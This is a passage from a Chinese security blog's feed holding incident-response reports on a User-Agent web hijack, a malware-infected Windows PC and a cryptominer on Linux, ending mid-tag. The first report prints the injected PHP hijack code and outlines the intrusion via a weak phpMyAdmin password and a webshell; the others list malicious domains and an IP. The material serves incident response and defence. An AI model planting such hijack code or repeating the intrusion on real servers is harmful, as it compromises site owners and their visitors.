应急处置人员"></a>2.2 应急处置人员</h2><table><thead><tr><th>序号</th><th>姓名</th><th>所属部门</th><th>主要职责</th><th>联系方式</th></tr></thead><tbody><tr><td>1</td><td>熊涛</td><td>***安全服务团队</td><td>安全运营工程师</td><td>176***</td></tr></tbody></table><h2 id="2-3-应急现场环境"><a href="#2-3-应急现场环境" class="headerlink" title="2.3 应急现场环境"></a>2.3 应急现场环境</h2><p>主机现场环境：</p><ul><li>主机ip&#x2F;域名:192.168.2.126</li><li>操作系统:Windows Server 2008 R2</li><li>应用类型:Web服务器</li><li>主要用途及应用:Web服务器（站库一体WNMP）</li><li>行为表现:本地网站，来自搜索引擎的访问（UA为常见搜索引擎）会跳转<a href="http://www.baidu.com页面/">http://www.baidu.com页面</a></li><li>安全防护措施:暂无</li></ul><h1 id="3-事件应急概况"><a href="#3-事件应急概况" class="headerlink" title="3 事件应急概况"></a>3 事件应急概况</h1><h2 id="3-1-事件影响描述"><a href="#3-1-事件影响描述" class="headerlink" title="3.1 事件影响描述"></a>3.1 事件影响描述</h2><p>本次网页User-Agent劫持主要造成如下影响:<br>(1)导致部分访问异常，网站配置代码被修改，影响正常业务;<br>(2)服务器已被黑客控制，主机上存在webshel。</p><h2 id="3-2-事件分析处置概况"><a href="#3-2-事件分析处置概况" class="headerlink" title="3.2 事件分析处置概况"></a>3.2 事件分析处置概况</h2><ul><li>事件类型 网页User-Agent劫持</li><li>问题综述<br>1、存在webshell（get_goods.php）；<br>2、配置源代码（base64.php）被修改。</li><li>事件分析处置概况<br>1、确定攻击IP；<br>2、定位出攻击手法、路径、时间线等；<br>3、确定网页劫持类型，以及造成劫持原因、恶意代码；<br>4、确认当前存在配置隐患，提供对应本地漏洞的修复建议。</li><li>遗留内容 日志中发现请求test.php记录，主机上暂未发现对应文件</li></ul><h2 id="3-3-事件分析结论"><a href="#3-3-事件分析结论" class="headerlink" title="3.3 事件分析结论"></a>3.3 事件分析结论</h2><p>网站被恶意劫持（当User-Agent为搜索引擎，如baidu、sogou等，就会跳转到<a href="http://www.baidu.com）；主要是通过phpMyAdmin弱口令作为切入点，通过SQL查询功能写入一句话木马，最后修改配置文件导致网页劫持。具体攻击流程如下：">www.baidu.com）；主要是通过phpMyAdmin弱口令作为切入点，通过SQL查询功能写入一句话木马，最后修改配置文件导致网页劫持。具体攻击流程如下：</a></p><p>2022年11月14日，黑客IP 192.168.139.1高频访问后台管理登录页面产生大量post记录，在16:47:46登录成功后台；<br>2022年11月14日16:48:02，访问对应SQL查询页面；<br>2022年11月14日16:49:52，成功上传webshell文件（get_goods.php）到www&#x2F;api目录下；<br>2022年11月14日17:10:43，配置文件base.php被修改。<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317112801785.png" alt="image-20230317112801785"></p><h1 id="4-事件排查过程"><a href="#4-事件排查过程" class="headerlink" title="4 事件排查过程"></a>4 事件排查过程</h1><h2 id="4-1-异常现象确认"><a href="#4-1-异常现象确认" class="headerlink" title="4.1 异常现象确认"></a>4.1 异常现象确认</h2><p>1、排查主机为Microsoft Windows Server 2008 R2 Standard系统，通过phpstudy搭建WEB环境，对应组件为常见WNMP组合（Apache、MySQL）；<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317112812753.png"><br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317112837695.png" alt="image-20230317112837695"></p><p>2、访问对应网站，页面显示正常，根据前期提供跳转百度页面进行排查，查看对应源代码没有相关关键字，排查加载恶意JS情况；<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317112848584.png" alt="image-20230317112848584"><br>3、接下来便是针对dll感染劫持以及UA类劫持的排查，通过关联检索对应字符“baidu”一一排查网站根目录下可疑文件；<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317112858649.png" alt="image-20230317112858649"><br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317112912484.png" alt="image-20230317112912484"><br>4、在对应目录C:\phpstudy_pro\WWW\phpcms下存在可疑文件base.php，对应文件为重要配置文件，查看源代码进一步确认;<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317112928549.png" alt="image-20230317112928549"><br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317112940579.png" alt="image-20230317112940579"><br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317112954924.png" alt="image-20230317112954924"><br>5、通过观察源代码，发现可疑代码串，其代码逻辑为检测常见搜索引擎的UA头，并跳转指定百度页面，与前期告知情况一致；<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113004960.png" alt="image-20230317113004960"><br>6、随后尝试修改对应UA头进行验证；</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113035981.png" alt="image-20230317113035981"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113046304.png" alt="image-20230317113046304"><br>7、至此确认为网页User-Agent类劫持，当UA头为常见搜索引擎（HaosouSpider、baidu、Yisou、Sogou、YisouSpider、360Spider、Baiduspide、Soso、Yahoo、bingbot)时，则跳转至<a href="http://www.baidu.com，劫持代码如下：">http://www.baidu.com，劫持代码如下：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$key= $_SERVER[&quot;HTTP_USER_AGENT&quot;];</span><br><span class="line">if(strpos($key,strtolower(&#x27;HaosouSpider&#x27;))!== false||strpos($key,strtolower(&#x27;baidu&#x27;))!== false||strpos($key,strtolower(&#x27;Yisou&#x27;))!== false||strpos($key,strtolower(&#x27;Sogou&#x27;))!== false||strpos($key,strtolower(&#x27;YisouSpider&#x27;))!== false||strpos($key,strtolower(&#x27;360Spider&#x27;))!== false||strpos($key,strtolower(&#x27;Baiduspide&#x27;))!== false||strpos($key,strtolower(&#x27;Soso&#x27;))!== false||strpos($key,strtolower(&#x27;Yahoo&#x27;))!== false||strpos($key,strtolower(&#x27;bingbot&#x27;))!== false )</span><br><span class="line">&#123;</span><br><span class="line">date_default_timezone_set(&#x27;PRC&#x27;);</span><br><span class="line">$TD_server = &quot;http://www.baidu.com&quot;;</span><br><span class="line">$host_name = &quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;PHP_SELF&#x27;];</span><br><span class="line">$Content_mb=file_get_contents($TD_server.&quot;/index.php?host=&quot;.$host_name.&quot;&amp;url=&quot;.$_SERVER[&#x27;QUERY_STRING&#x27;].&quot;&amp;domain=&quot;.$_SERVER[&#x27;SERVER_NAME&#x27;]);</span><br><span class="line">echo $Content_mb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-2-溯源分析过程"><a href="#4-2-溯源分析过程" class="headerlink" title="4.2 溯源分析过程"></a>4.2 溯源分析过程</h2><p>1、首先根据前期确认情况，以Web服务器常见排查项（webshell、web日志）以及配置文件base.php修改时间作为切入点进行溯源分析。进而将时间线锁定在2022年11月14日前后；<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113102943.png" alt="image-20230317113102943"><br>2、随即分析相关web日志（前期确认为Apache中间件），关联浏览器历史确认网站于11月7日部署；<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113116622.png" alt="image-20230317113116622"><br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113126388.png" alt="image-20230317113126388"><br>3、发现11月14日web日志中存在可疑行为，后续关联确认攻击者IP 192.168.139.1恶意操作；<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113135758.png" alt="image-20230317113135758"><br>经确认，对应管理页面确实为弱口令（root：root）<img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113149342.png" alt="image-20230317113149342"><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113200465.png" alt="image-20230317113200465"><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113211438.png" alt="image-20230317113211438"><br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113226891.png" alt="image-20230317113226891"><br>webshell目录为C:\phpstudy_pro\WWW\api\get_goods.php<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113238292.png" alt="image-20230317113238292"><br>4、对应SQL查询语句已证实存在相关漏洞；<img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113248869.png" alt="image-20230317113248869"><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113307951.png" alt="image-20230317113307951"><br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113317465.png" alt="image-20230317113317465"><br>通过手动复现，成功上传webshell；<img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113326682.png" alt="image-20230317113326682"><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113335553.png" alt="image-20230317113335553"><br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113346049.png" alt="image-20230317113346049"><br>且流量日志与对应攻击者当天日志类似，初步研判为同一漏洞导致；<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113403379.png" alt="image-20230317113403379"><br>对应漏洞可通过修改配置文件实现防护，默认配置为’’；<img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113414009.png" alt="image-20230317113414009"><br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113424016.png" alt="image-20230317113424016"><br>更改配置后无法上传webshell，一定程度上实现了防护；<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113433160.png" alt="image-20230317113433160"><br>5、关联web根目录、webshell目录排查相关时间节点文件，未发现可疑；<img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113441756.png" alt="image-20230317113441756"><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113451074.png" alt="image-20230317113451074"><br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113500425.png" alt="image-20230317113500425"><br>6、通过webshell查杀工具进行全盘查杀，未发现更多可疑情况；<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113508595.png" alt="image-20230317113508595"><br>7、web日志前期现象确认阶段已分析清除，目前确认攻击者IP、攻击者手段（弱口令进入–一句话木马写入–修改配置文件实现网页劫持)、攻击时间线，暂未发现其他可疑情况</p><h2 id="4-3-事件应急处置"><a href="#4-3-事件应急处置" class="headerlink" title="4.3 事件应急处置"></a>4.3 事件应急处置</h2><p>1、清除webshell文件，对应目录为：C:\phpstudy_pro\WWW\api\get_goods.php；<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113516831.png" alt="image-20230317113516831"><br>2、考虑到对应base.php为业务配置文件，不便删除，便将对应恶意代码串进行注释；<img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113525090.png" alt="image-20230317113525090"><br>3、最后修改UA、不修改UA访问进行测试，网站均正常，至此本次应急处置结束。<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113537854.png" alt="image-20230317113537854"></p><h1 id="5-安全隐患"><a href="#5-安全隐患" class="headerlink" title="5 安全隐患"></a>5 安全隐患</h1><h2 id="5-1-技术问题"><a href="#5-1-技术问题" class="headerlink" title="5.1 技术问题"></a>5.1 技术问题</h2><p>恶意文件<br>1）服务器&#x2F;终端上存在大量的恶意文件，主要包括：僵尸网络、挖矿软件、病毒文件、木马远控制、推广软件等<br>2）发现黑客利用恶意文件进行攻击<br>服务器存在webshell<br>1）发现服务器被上传webshell<br>2）发现黑客利用webshell进行攻击<br>账号安全<br>口令安全<br>1）服务器与web服务存在弱口令<br>2）系统存在相同口令<br>3）密码不满足复杂度要求<br>4）未配置防爆破策略<br>漏洞隐患<br>1）服务器与web服务存在弱口令<br>2）系统存在相同口令<br>3）密码不满足复杂度要求<br>4）未配置防爆破策略</p><h2 id="5-2-管理问题"><a href="#5-2-管理问题" class="headerlink" title="5.2 管理问题"></a>5.2 管理问题</h2><p>边界防护不完整<br>1）边界缺乏WAF、AF等安全防护设备，无法进行安全防护<br>2）发现部分服务器的IP和web端口未加入到WAF的防护中</p><h1 id="6-安全整改建议"><a href="#6-安全整改建议" class="headerlink" title="6 安全整改建议"></a>6 安全整改建议</h1><h2 id="6-1-技术加固建议"><a href="#6-1-技术加固建议" class="headerlink" title="6.1 技术加固建议"></a>6.1 技术加固建议</h2><p>针对本次事件，前期现象确认阶段，已证实相关攻击者所利用漏洞，也展示了相关防护配置，见上文<br>1、加强Root数据库用户口令（root）；<br>2、配置secure_file_priv具体参数；<br>3、网站路径不对所有用户开放写入权限。<img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113548084.png" alt="image-20230317113548084"><br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317113554771.png" alt="image-20230317113554771"><br>服务器存在webshell<br>1）利用D盾、EDR、SIP等工具与平台进行检查与查杀<br>2）分析日志，确定黑客入侵方式，并针对性进行加固。<br>3）定期进行渗透测试、漏洞扫描等，并会对扫描出来的漏洞进行加固<br>账号安全<br>口令安全<br>1)密码复杂度 - 最短密码长度要求八个字符，密码含有数字、大小写英文字母和特殊字符。并禁止多台服务器相同口令。<br>2)禁用Guest账号，禁用或删除其他无用账号。<br>3)禁用administrator账号，为跳板机用户专门设置新的账号。<br>4)账号尝试登陆5次后将该账号进行封锁半小时不运行登陆的禁令。<br>漏洞隐患<br>1）对web服务器的组件与版本、补丁进行升级、修改配置<br>2）部署WAF、EDR进行安全防护<br>3)定期进行渗透测试、风险评估以发现可能存在的漏洞</p><h2 id="6-2-安全管理建议"><a href="#6-2-安全管理建议" class="headerlink" title="6.2 安全管理建议"></a>6.2 安全管理建议</h2><p>边界防护不完整<br>1）在边界增加AF、WAF等安全设备进行防护<br>2）梳理资产，将面向互联网开放的web服务器的IP地址和端口加入到WAF防护中</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-应急响应报告摘要&quot;&gt;&lt;a href=&quot;#1-应急响应报告摘要&quot; class=&quot;headerlink&quot; title=&quot;1 应急响应报告摘要&quot;&gt;&lt;/a&gt;1 应急响应报告摘要&lt;/h1&gt;&lt;p&gt;时间点2022年12月8日发现客户网站存在某种网页劫持，会将网页劫持跳转到&lt;</summary>
      
    
    
    
    <category term="学习" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="应急响应" scheme="http://example.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
    <category term="网页劫持" scheme="http://example.com/tags/%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>Windows-Dll劫持</title>
    <link href="http://example.com/2023/03/16/Windows-Dll%E5%8A%AB%E6%8C%81/"/>
    <id>http://example.com/2023/03/16/Windows-Dll%E5%8A%AB%E6%8C%81/</id>
    <published>2023-03-16T03:40:29.000Z</published>
    <updated>2023-03-16T16:51:20.915Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><p>筛选器fltmc，高度较高的筛选器驱动可疑</p><p>内核–文件系统–微端口过滤器–常见隐藏文件驱动（移除恶意过滤器）</p><p>内核–查看函数地址，对比内核–系统回调–cmpcallback（注册表地址HKLM\SYSTEM\CurrentControlSet\services\KMDFL）</p><p>紫狐木马，关键dll，Ms**.dll</p><p>svchost，查看线程是否被进程注入，查看进程模块是否被劫持</p><p>1、紫狐木马</p><p>2、麻辣香锅</p><p>3、域名通信</p><p>进程模块、启动项、恶意dll、进程终止</p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>A客户被通报内网存在外联多个恶意域名，域名如下<br>asuradoll.3322.org<br>carbonsteelsuppliersindia.co.in<br>superyou.zapto.org<br>xred.mooo.com<br>45.142.166.112<br>经过定位以上均为内网终端win7发起（现已将镜像打包），并且通过流量设备发现该pc还存在扫描内网445、1433行为，此外，该pc的使用人还反馈自己每次打开浏览器都会先跳转到一个网址后再跳回浏览器首页，他不想再让浏览器变成这样了。</p><h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><p>客户希望通过此次处理该pc的以上现象不在发生，即彻底清理，并形成相应的报告好跟上级领导交代。</p><p>1、外联恶意域名asuradoll.3322.org：存在AntiVir服务拉起恶意dll文件，导致外联</p><p>2、外联恶意域名carbonsteelsuppliersindia.co.in：Explore进程加载恶意模块，导致外联</p><p>3、外联恶意域名superyou.zapto.org：恶意程序sys.exe拉起</p><p>4、外联恶意域名xred.mooo.com：XRED蠕虫病毒，Synaptics.exe拉起</p><p>5、外联恶意IP45.142.166.112：未发现外联行为，根据威胁情报关联程序AvastSvcpCP</p><p>6、扫描内网445、1433行为：紫狐木马导致</p><p>7、浏览器跳转：麻辣香锅病毒导致</p><h1 id="一、紫狐木马"><a href="#一、紫狐木马" class="headerlink" title="一、紫狐木马"></a>一、紫狐木马</h1><p>1、通过排查工具发现主机存在扫描445、1433端口行为，查看驱动等确认为感染紫狐木马</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316212243796.png" alt="image-20230316212243796"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316212742335.png" alt="image-20230316212742335"></p><p>2、参照紫狐木马处置，移除过滤器、删除回调</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316213135618.png" alt="image-20230316213135618"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316213102331.png" alt="image-20230316213102331"></p><p>3、重启后，删除启动服务、注册表以及恶意文件MS*.dll</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316213755989.png" alt="image-20230316213755989"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316214803208.png" alt="image-20230316214803208"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316214524080.png" alt="image-20230316214524080"></p><h1 id="二、麻辣香锅"><a href="#二、麻辣香锅" class="headerlink" title="二、麻辣香锅"></a>二、麻辣香锅</h1><p>1、确认浏览器打开后，存在主页劫持现象，根据域名信息和前期排查筛选器确认为感染麻辣香锅病毒</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316215106150.png" alt="image-20230316215106150"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316212742335.png" alt="image-20230316212742335"></p><p>2、同样移除过滤器、删除回调（过滤器发现明显带有mlxg字符的驱动）</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316215331206.png" alt="image-20230316215331206"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316215541352.png" alt="image-20230316215541352"></p><p>3、停止对应恶意进程、删除病毒文件、驱动、恶意文件</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316220216898.png" alt="image-20230316220216898"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316220430208.png" alt="image-20230316220430208"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316221552735.png" alt="image-20230316221552735"></p><h1 id="三、外联域名asuradoll-3322-org"><a href="#三、外联域名asuradoll-3322-org" class="headerlink" title="三、外联域名asuradoll.3322.org"></a>三、外联域名asuradoll.3322.org</h1><p>1、通过僵尸网络工具定位恶意域名通信进程、启动项</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316224640016.png" alt="image-20230316224640016"></p><p>2、关联恶意加载模块</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316224742894.png" alt="image-20230316224742894"></p><p>3、域名威胁情报关联恶意样本，一并删除</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316234031423.png" alt="image-20230316234031423"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316234131522.png" alt="image-20230316234131522"></p><p>4、停止进程、删除服务，重启后正常</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316224914411.png" alt="image-20230316224914411"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316233240507.png" alt="image-20230316233240507"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316233425018.png" alt="image-20230316233425018"></p><h1 id="四、外联域名carbonsteelsuppliersindia-co-in"><a href="#四、外联域名carbonsteelsuppliersindia-co-in" class="headerlink" title="四、外联域名carbonsteelsuppliersindia.co.in"></a>四、外联域名carbonsteelsuppliersindia.co.in</h1><p>1、通过僵尸网络工具定位进程</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316234618039.png" alt="image-20230316234618039"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317000155253.png" alt="image-20230317000155253"></p><p>2、删除关联恶意启动项、终止进程</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316235428538.png" alt="image-20230316235428538"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316235532384.png" alt="image-20230316235532384"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317000444813.png" alt="image-20230317000444813"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317000608584.png" alt="image-20230317000608584"></p><p>3、清除威胁情报关联恶意文件</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317001607617.png" alt="image-20230317001607617"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317001626339.png" alt="image-20230317001626339"></p><p>4、通过Synaptics专杀工具处置，重启恢复正常</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317001901011.png" alt="image-20230317001901011"></p><h1 id="五、外联域名superyou-zapto-org"><a href="#五、外联域名superyou-zapto-org" class="headerlink" title="五、外联域名superyou.zapto.org"></a>五、外联域名superyou.zapto.org</h1><p>1、通过僵尸网络工具定位恶意域名通信进程、启动项</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317002234993.png" alt="image-20230317002234993"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317002249441.png" alt="image-20230317002249441"></p><p>2、终止对应进程、删除启动项等，关联威胁情报可疑文件</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317002659804.png" alt="image-20230317002659804"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317002716711.png" alt="image-20230317002716711"></p><p>3、重启后恢复正常，检索未发现新增情况</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317002925988.png"></p><h1 id="六、外联域名xred-mooo-com"><a href="#六、外联域名xred-mooo-com" class="headerlink" title="六、外联域名xred.mooo.com"></a>六、外联域名xred.mooo.com</h1><p>1、通过僵尸网络工具定位恶意域名通信进程、启动项</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317003307742.png" alt="image-20230317003307742"></p><p>2、对应进程为Synaptics，终止进程并通过Synaptics专杀工具恢复</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317003258168.png" alt="image-20230317003258168"></p><h1 id="七、外联IP-45-142-166-112"><a href="#七、外联IP-45-142-166-112" class="headerlink" title="七、外联IP 45.142.166.112"></a>七、外联IP 45.142.166.112</h1><p>1、通过工具检索未发现可疑情况</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317004356580.png" alt="image-20230317004356580"></p><p>2、关联IP威胁情报信息，样本文件在主机上有同名文件</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317004721219.png" alt="image-20230317004721219"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317004736877.png" alt="image-20230317004736877"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317004818853.png" alt="image-20230317004818853"></p><p>3、删除上诉发现文件，并清理启动项</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317004939478.png" alt="image-20230317004939478"></p><p>4、至此主机上所有恶意外联行为，均以定位处置，恶意文件均已清理，主机恢复正常</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tips&quot;&gt;&lt;a href=&quot;#Tips&quot; class=&quot;headerlink&quot; title=&quot;Tips&quot;&gt;&lt;/a&gt;Tips&lt;/h1&gt;&lt;p&gt;筛选器fltmc，高度较高的筛选器驱动可疑&lt;/p&gt;
&lt;p&gt;内核–文件系统–微端口过滤器–常见隐藏文件驱动（移除恶意过滤器）&lt;</summary>
      
    
    
    
    <category term="学习" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="应急响应" scheme="http://example.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Tp-viurs挖矿应急</title>
    <link href="http://example.com/2023/03/15/Tp-viurs%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5/"/>
    <id>http://example.com/2023/03/15/Tp-viurs%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5/</id>
    <published>2023-03-15T14:16:42.000Z</published>
    <updated>2023-03-16T03:03:44.044Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>客户服务器异常卡顿，请进行相关排查和处置并溯源攻击路径</p><h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><p>1.定位主机全部异常项目（异常进程、异常定时任务、异常文件等等）并进行相应处置</p><p>a)异常进程：&#x2F;root&#x2F;.configures&#x2F;xmrig</p><p>b)异常定时任务：&#x2F;root&#x2F;.configures&#x2F;ping.sh</p><p>c)异常外联通信：donate.v2.xmrig.com、199.247.27.41、178.128.242.134</p><p>d)异常服务：SystemRaid.service</p><p>e)异常文件：目录&#x2F;root&#x2F;.configures&#x2F;下挖矿病毒本体、挖矿配置文件等</p><p>f)异常库文件劫持：&#x2F;root&#x2F;.configures&#x2F;p.so</p><p>g)异常ssh公钥：&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p><p>2.溯源攻击路径（需包含时间点和对应操作）</p><p>攻击者：192.168.100.253</p><p>本次攻击最早发起时间：2022.12.15 02:24</p><p>攻击方式：SSH爆破、SSH公钥登录</p><p>时间线梳理：</p><p>1)早期服务器遭受攻击，主机上留有SSH公钥，文件落地时间（2022.02.18 05:10）</p><p>2)攻击者通过SSH公钥登录，时间点2022.12.15 02:24</p><p>3)攻击者IP  192.168.100.253在时间点2022.12.15 02:24尝试SSH爆破</p><p>4)定时任务在时间点2022.12.15 02:29，随后02:30执行</p><p>5)攻击者IP  192.168.100.253登录成功，日志记录时间点2022.12.15 02:34</p><p>6)攻击者上传挖矿病毒等恶意文件，时间点2022.12.15 02:52</p><h1 id="一、排查确认"><a href="#一、排查确认" class="headerlink" title="一、排查确认"></a>一、排查确认</h1><p>1、根据现有情况，top命令未发现高占用进程</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315230843562.png" alt="image-20230315230843562"></p><p>2、结合服务器卡顿初步怀疑为感染蠕虫、挖矿等恶意病毒，查看网络连接未发现异常，随即通过tcpdump抓包</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315232319724.png" alt="image-20230315232319724"></p><p>3、抓包发现异常域名请求，以及可疑外联IP，关联矿池威胁情报信息</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315232505749.png" alt="image-20230315232505749"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315232534006.png" alt="image-20230315232534006"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315232542799.png" alt="image-20230315232542799"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315232706378.png" alt="image-20230315232706378"></p><p>4、查看网络连接没有发现对应进程PID，推测可能为库文件劫持</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315232910447.png" alt="image-20230315232910447"></p><p>5、下载busybox，发现库文件劫持，同时记录文件落地时间</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315233131845.png" alt="image-20230315233131845"></p><p>6、清除对应库文件劫持，命令恢复正常，关联恶意外联对应进程、PID</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315233421954.png" alt="image-20230315233421954"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315233434354.png" alt="image-20230315233434354"></p><p>7、根据进程找到挖矿病毒本地，恶意文件同目录下还存在其他配置文件、启动脚本</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315233659181.png" alt="image-20230315233659181"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315233710381.png" alt="image-20230315233710381"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315234231104.png" alt="image-20230315234231104"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315234240840.png" alt="image-20230315234240840"></p><p>8、查看挖矿进程的相关信息，可以确认为计划任务拉起的挖矿进程，计划任务打开的程序为</p><p>&#x2F;root&#x2F;.configures&#x2F;ping.sh</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315235000939.png" alt="image-20230315235000939"></p><p>9、查看最早拉起进程PID信息，关联可疑服务</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315235634675.png" 